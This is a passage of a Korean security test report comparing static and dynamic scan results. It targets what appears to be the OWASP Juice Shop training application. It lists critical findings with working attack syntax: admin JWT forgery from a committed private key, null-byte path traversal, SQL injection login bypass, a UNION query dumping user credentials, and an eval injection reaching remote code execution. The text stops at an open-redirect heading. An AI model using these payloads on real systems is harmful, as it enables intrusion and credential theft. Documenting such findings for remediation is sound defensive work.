SAST ↔ DAST 대조

구분건수의미
SAST 동적 확증9룰이 잡고 실제 익스플로잇으로 재현
DAST 추가 발견(미탐)7SAST가 못 본 것 — 접근제어·노출·헤더·무차별방어
SAST 오탐·비적용34대시보드 제외 → 엔진 개선용(별도 문서)

SAST는 인젝션·경로순회처럼 데이터 흐름이 보이는 것에 강하고, IDOR·권한·민감 엔드포인트 노출·보안헤더처럼 인가/설정/부재는 구조적으로 못 본다 → DAST로 메운다.

확정 취약점

크리티컬 (5건)

크리티컬 SAST 확증 F028 · hardcoded-secret

lib/insecurity.ts:54

확인: 위조 RS256 토큰 수락(HTTP 200, 전체 사용자 목록 반환), 쓰레기 토큰은 401 — 커밋된 개인키로 완전 인증 우회

공격 구문
encryptionkeys/ 에 커밋된 개인키로 admin JWT 위조:
  header  {"alg":"RS256","typ":"JWT"}
  payload {"data":{"email":"admin@juice-sh.op","role":"admin"}}
  리포지토리 내 RSA 개인키로 서명 후:
  Authorization: Bearer <위조토큰>   → admin 으로 인증됨.
크리티컬 SAST 확증 F029 · path-traversal

routes/fileServer.ts:32

확인: null-byte 우회로 /ftp/package.json.bak%2500.md 획득 (4261 bytes)

공격 구문
poison null byte 로 .md/.pdf 허용검사 우회:
  GET /ftp/package.json%2500.md          → package.json 다운로드
  GET /ftp/eastere.gg%2500.md
크리티컬 SAST 확증 F032 · sql-injection

routes/login.ts:34

확인: 인증 우회 성공 — admin@juice-sh.op 토큰 발급

공격 구문
email 필드 SQLi 로 인증 우회:
  POST /rest/user/login
  {"email":"' OR 1=1--","password":"x"}      → 첫 사용자(admin)로 로그인
  또는  {"email":"admin@juice-sh.op'--", ...}
크리티컬 SAST 확증 F035 · sql-injection

routes/search.ts:23

확인: union 주입으로 Users 테이블에서 24개 이메일 행 탈취

공격 구문
상품 검색의 union 기반 SQLi:
  GET /rest/products/search?q=qwert'))--                 (주입 확인)
  GET /rest/products/search?q=qwert')) UNION SELECT id,email,password,'4','5','6','7','8','9' FROM Users--   (자격증명 덤프)
크리티컬 SAST 확증 F036 · code-injection

routes/userProfile.ts:65

확인: eval이 공격자 표현식 실행 — 프로필에 #{99999*7} 결과 699993 렌더링

공격 구문
프로필 username 을 통한 서버측 템플릿/eval 주입:
  username 을  #{7*7}  로 설정                              → 49 렌더(eval 확인)
  RCE:  #{global.process.mainModule.require('child_process').execSync('id')}

높음 SAST 확증 F034 · open-redirect
